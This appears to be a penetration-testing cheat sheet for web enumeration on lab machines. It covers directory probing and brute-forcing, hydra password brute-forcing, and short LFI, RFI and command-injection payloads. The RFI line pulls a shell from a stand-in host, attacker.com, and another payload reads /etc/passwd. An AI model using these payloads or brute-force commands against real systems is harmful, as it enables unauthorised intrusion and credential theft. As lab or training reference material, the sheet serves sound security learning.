## 🌐 Web Enumeration (Machines 91–100)

### Common Directories and Panels
```bash
curl -I http://<IP>/admin.php             # Admin panel
curl -I http://<IP>/config.php            # Exposed config
curl -I http://<IP>/backup                # Backup directory
curl -I http://<IP>/phpmyadmin            # phpMyAdmin panel
curl -I http://<IP>/.git/                 # Check for exposed .git repo
```

### Directory Bruteforcing
```bash
gobuster dir -u http://<IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt
ffuf -u http://<IP>/FUZZ -w /usr/share/wordlists/dirb/common.txt
```

### Default Credentials / Login Forms
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt <IP> http-get /admin/login
```

### LFI/RFI/Command Injection
```bash
curl http://<IP>/index.php?page=../../../../etc/passwd          # LFI
curl http://<IP>/index.php?page=http://attacker.com/shell.txt   # RFI
curl http://<IP>/vuln.php?input=;id                             # Command Injection
```

### Web CMS & Service Identification
```bash
whatweb http://<IP>
wappalyzer http://<IP>
nmap --script=http-enum -p 80,443 <IP>
```

### Example Findings Summary
- Exposed `.git/` repo allowed retrieval of source code.
- `phpinfo()` exposed sensitive PHP environment details.
- Login form brute-forced using default creds (admin:admin).
- `LFI` in `view.php?page=` retrieved `/etc/passwd`.
- CMS detection: Joomla 3.7 → Known SQLi (CVE-2017-8917).
